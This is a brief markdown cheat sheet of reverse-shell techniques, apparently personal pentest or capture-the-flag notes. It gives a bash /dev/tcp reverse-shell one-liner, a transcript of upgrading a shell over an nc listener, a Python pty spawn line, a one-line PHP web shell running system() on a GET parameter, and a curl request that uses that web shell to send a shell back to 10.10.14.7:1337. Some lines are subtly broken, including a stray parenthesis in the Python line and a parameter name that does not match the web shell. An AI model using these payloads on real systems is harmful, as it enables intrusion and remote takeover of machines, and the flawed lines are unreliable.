# Reverse Shells

## One-Liners

### Bash
Easy Bash
```
bash -c "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
```
* **Shell Upgrades**
  ```bash
  root@target:/backend# script /dev/null -c bash
  script /dev/null -c bash            
  Script started, file is /dev/null
  root@target:/backend# ^Z                 
  [1]+  Stopped                 nc -lnvp 1337
  chuxtr@kali$ stty raw -echo; fg
  nc -lnvp 1337
            reset
  reset: unknown terminal type unknown
  Terminal type? screen
  root@target:/backend#
  ```
* **Python Shell Upgrade
  ```bash
  python -c ('import pty; pty.spawn("/bin/bash")'
  ```
### PHP
Simple PHP WebShell
```bash
<?php system($_GET["Chuxtr"]); ?>
```
Example
```bash
echo '<?php system($_GET["Chuxtr"]); ?>' > Chuxtr.php
```
Usage
```bash
# This example produces a bash shell back to the host (Note the URL encoding)
root@kali# curl 'http://127.0.0.1:52846/Chuxtr.php?chuxtr=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.7/1337%200%3E%261%27'
```
## Scripts
### Powershell

